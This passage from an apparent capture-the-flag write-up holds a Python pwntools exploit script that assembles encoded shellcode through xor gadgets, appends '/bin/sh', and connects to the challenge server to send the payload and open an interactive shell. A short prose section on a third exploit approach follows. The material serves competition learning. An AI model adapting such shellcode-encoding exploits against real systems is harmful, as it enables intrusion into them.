</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;G6&#39;</span><span class=p>,</span> <span class=s1>&#39;E4&#39;</span><span class=p>,</span> <span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;E0&#39;</span><span class=p>,</span> <span class=s1>&#39;D9&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G4&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G5&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G6&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G7&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=c1># Write on shellcode and inc esi to write next byte</span>
</span></span><span class=line><span class=cl><span class=c1># F0F0 : [&#34;inc esi&#34;, &#34;xor byte ptr [esi + 0x30], al&#34;];</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;F0F0&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Set al 0xd6</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;G6&#39;</span><span class=p>,</span> <span class=s1>&#39;E4&#39;</span><span class=p>,</span> <span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;E0&#39;</span><span class=p>,</span> <span class=s1>&#39;D9&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G4&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G5&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G6&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G7&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=c1># Write on shellcode and inc esi to write next byte</span>
</span></span><span class=line><span class=cl><span class=c1># F0F0 : [&#34;inc esi&#34;, &#34;xor byte ptr [esi + 0x30], al&#34;];</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;F0F0&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Set al 0x2</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;G6&#39;</span><span class=p>,</span> <span class=s1>&#39;E4&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G9&#39;</span><span class=p>,</span> <span class=s1>&#39;A2&#39;</span><span class=p>,</span> <span class=s1>&#39;E3&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=c1># Write on shellcode and inc esi to write next byte</span>
</span></span><span class=line><span class=cl><span class=c1># F0F0 : [&#34;inc esi&#34;, &#34;xor byte ptr [esi + 0x30], al&#34;];</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;F0F0&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Set al 0x86</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;G6&#39;</span><span class=p>,</span> <span class=s1>&#39;E4&#39;</span><span class=p>,</span> <span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;E0&#39;</span><span class=p>,</span> <span class=s1>&#39;D1&#39;</span><span class=p>,</span> <span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;E0&#39;</span><span class=p>,</span> <span class=s1>&#39;D9&#39;</span><span class=p>,</span> <span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;B4&#39;</span><span class=p>,</span> <span class=s1>&#39;G5&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G6&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G7&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G8&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G9&#39;</span><span class=p>,</span> <span class=s1>&#39;A2&#39;</span><span class=p>,</span> <span class=s1>&#39;E3&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=c1># Write on shellcode and inc esi to write next byte</span>
</span></span><span class=line><span class=cl><span class=c1># F0F0 : [&#34;inc esi&#34;, &#34;xor byte ptr [esi + 0x30], al&#34;];</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;F0F0&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Set al 0x83</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;G6&#39;</span><span class=p>,</span> <span class=s1>&#39;E4&#39;</span><span class=p>,</span> <span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;B4&#39;</span><span class=p>,</span> <span class=s1>&#39;G5&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=c1># Write on shellcode and inc esi to write next byte</span>
</span></span><span class=line><span class=cl><span class=c1># F0F0 : [&#34;inc esi&#34;, &#34;xor byte ptr [esi + 0x30], al&#34;];</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;F0F0&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Set al 0x4d</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G1&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G6&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G7&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G8&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G9&#39;</span><span class=p>,</span> <span class=s1>&#39;A2&#39;</span><span class=p>,</span> <span class=s1>&#39;E3&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=c1># Write on shellcode and inc esi to write next byte</span>
</span></span><span class=line><span class=cl><span class=c1># F0F0 : [&#34;inc esi&#34;, &#34;xor byte ptr [esi + 0x30], al&#34;];</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;F0F0&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Set al 0x88</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;G6&#39;</span><span class=p>,</span> <span class=s1>&#39;E4&#39;</span><span class=p>,</span> <span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;E0&#39;</span><span class=p>,</span> <span class=s1>&#39;D1&#39;</span><span class=p>,</span> <span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;B4&#39;</span><span class=p>,</span> <span class=s1>&#39;G5&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G3&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G7&#39;</span><span class=p>,</span> <span class=s1>&#39;A2&#39;</span><span class=p>,</span> <span class=s1>&#39;E3&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=c1># Write on shellcode and inc esi to write next byte</span>
</span></span><span class=line><span class=cl><span class=c1># F0F0 : [&#34;inc esi&#34;, &#34;xor byte ptr [esi + 0x30], al&#34;];</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;F0F0&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Set al 0x3a</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;G6&#39;</span><span class=p>,</span> <span class=s1>&#39;E4&#39;</span><span class=p>,</span> <span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;B4&#39;</span><span class=p>,</span> <span class=s1>&#39;G5&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G3&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G8&#39;</span><span class=p>,</span> <span class=s1>&#39;A2&#39;</span><span class=p>,</span> <span class=s1>&#39;E3&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=c1># Write on shellcode and inc esi to write next byte</span>
</span></span><span class=line><span class=cl><span class=c1># F0F0 : [&#34;inc esi&#34;, &#34;xor byte ptr [esi + 0x30], al&#34;];</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;F0F0&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Set al 0x7d</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;G6&#39;</span><span class=p>,</span> <span class=s1>&#39;E4&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=c1># Write on shellcode and inc esi to write next byte</span>
</span></span><span class=line><span class=cl><span class=c1># F0F0 : [&#34;inc esi&#34;, &#34;xor byte ptr [esi + 0x30], al&#34;];</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;F0F0&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Set al 0x06</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;G6&#39;</span><span class=p>,</span> <span class=s1>&#39;E4&#39;</span><span class=p>,</span> <span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;E0&#39;</span><span class=p>,</span> <span class=s1>&#39;D9&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G4&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G6&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G7&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G9&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=c1># Write on shellcode and inc esi to write next byte</span>
</span></span><span class=line><span class=cl><span class=c1># F0F0 : [&#34;inc esi&#34;, &#34;xor byte ptr [esi + 0x30], al&#34;];</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;F0F0&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Set al 0x73</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;G6&#39;</span><span class=p>,</span> <span class=s1>&#39;E4&#39;</span><span class=p>,</span> <span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;E0&#39;</span><span class=p>,</span> <span class=s1>&#39;D9&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G4&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G5&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G6&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G7&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=c1># Write on shellcode and inc esi to write next byte</span>
</span></span><span class=line><span class=cl><span class=c1># F0F0 : [&#34;inc esi&#34;, &#34;xor byte ptr [esi + 0x30], al&#34;];</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;F0F0&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Set al 0x77</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G5&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G6&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G8&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G9&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=c1># Write on shellcode and inc esi to write next byte</span>
</span></span><span class=line><span class=cl><span class=c1># F0F0 : [&#34;inc esi&#34;, &#34;xor byte ptr [esi + 0x30], al&#34;];</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;F0F0&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Set al 0xfa</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;G6&#39;</span><span class=p>,</span> <span class=s1>&#39;E4&#39;</span><span class=p>,</span> <span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;B4&#39;</span><span class=p>,</span> <span class=s1>&#39;G5&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G6&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G7&#39;</span><span class=p>,</span> <span class=s1>&#39;A2&#39;</span><span class=p>,</span> <span class=s1>&#39;E3&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=c1># Write on shellcode and inc esi to write next byte</span>
</span></span><span class=line><span class=cl><span class=c1># F0F0 : [&#34;inc esi&#34;, &#34;xor byte ptr [esi + 0x30], al&#34;];</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;F0F0&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Set al 0x77</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;G6&#39;</span><span class=p>,</span> <span class=s1>&#39;E4&#39;</span><span class=p>,</span> <span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;B4&#39;</span><span class=p>,</span> <span class=s1>&#39;G5&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G6&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G7&#39;</span><span class=p>,</span> <span class=s1>&#39;A2&#39;</span><span class=p>,</span> <span class=s1>&#39;E3&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=c1># Write on shellcode and inc esi to write next byte</span>
</span></span><span class=line><span class=cl><span class=c1># F0F0 : [&#34;inc esi&#34;, &#34;xor byte ptr [esi + 0x30], al&#34;];</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;F0F0&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Set al 0xe1</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;G6&#39;</span><span class=p>,</span> <span class=s1>&#39;E4&#39;</span><span class=p>,</span> <span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;B4&#39;</span><span class=p>,</span> <span class=s1>&#39;G5&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G9&#39;</span><span class=p>,</span> <span class=s1>&#39;A2&#39;</span><span class=p>,</span> <span class=s1>&#39;E3&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=c1># Write on shellcode and inc esi to write next byte</span>
</span></span><span class=line><span class=cl><span class=c1># F0F0 : [&#34;inc esi&#34;, &#34;xor byte ptr [esi + 0x30], al&#34;];</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;F0F0&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Set al 0x8b</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;G6&#39;</span><span class=p>,</span> <span class=s1>&#39;E4&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G5&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=c1># Write on shellcode and inc esi to write next byte</span>
</span></span><span class=line><span class=cl><span class=c1># F0F0 : [&#34;inc esi&#34;, &#34;xor byte ptr [esi + 0x30], al&#34;];</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;F0F0&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Set al 0xb3</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=s1>&#39;D5&#39;</span><span class=p>,</span> <span class=s1>&#39;B4&#39;</span><span class=p>,</span> <span class=s1>&#39;G5&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G5&#39;</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>,</span> <span class=s1>&#39;G7&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=c1># Write on shellcode and inc esi to write next byte</span>
</span></span><span class=line><span class=cl><span class=c1># F0F0 : [&#34;inc esi&#34;, &#34;xor byte ptr [esi + 0x30], al&#34;];</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;F0F0&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=n>NOP</span><span class=p>)</span><span class=o>*</span><span class=p>(</span><span class=mi>2260</span><span class=o>/</span><span class=mi>4</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\xff\xff</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>MASK</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;/bin/sh&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=s2>&#34;PAYLOAD LEN:&#34;</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve_pow</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=n>context</span><span class=o>.</span><span class=n>local</span><span class=p>(</span><span class=n>log_level</span><span class=o>=</span><span class=s1>&#39;warning&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;our_1337_server&#39;</span><span class=p>,</span> <span class=mi>13337</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>s</span> <span class=o>+</span> <span class=s1>&#39; &#39;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>n</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                <span class=n>res</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                <span class=n>r</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>res</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>connect</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;4e6b5b46.quals2018.oooverflow.io&#39;</span><span class=p>,</span> <span class=mi>31337</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Challenge: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>chall_s</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;n: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>chall_n</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>())</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span> <span class=s1>&#39;solving pow </span><span class=si>%s</span><span class=s1> </span><span class=si>%d</span><span class=s1>&#39;</span> <span class=o>%</span> <span class=p>(</span><span class=n>chall_s</span><span class=p>,</span> <span class=n>chall_n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>solve_pow</span><span class=p>(</span><span class=n>chall_s</span><span class=p>,</span> <span class=n>chall_n</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>r</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>done</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=ow>not</span> <span class=n>done</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>conn</span> <span class=o>=</span> <span class=n>connect</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=c1>#conn = remote(&#34;127.0.0.1&#34;, 4000)</span>
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;sound?&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span></code></pre></div><h3 class="relative group">Third Exploit<div id=third-exploit class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#third-exploit aria-label=Anchor>#</a></span></h3><p>The third idea requires to carefully craft a copy primitive via <code>xor</code> instructions, and use the available instructions considering whether you have both a read and write gadget where needed, turns out we need to employ <code>edi</code> as &ldquo;source&rdquo; register and <code>esi</code> as a &ldquo;destination&rdquo; register. We can set the masks accordingly by using just two gadgets. The shellcode in the <code>USER_INPUT</code> section will get copied via the xor instructions.
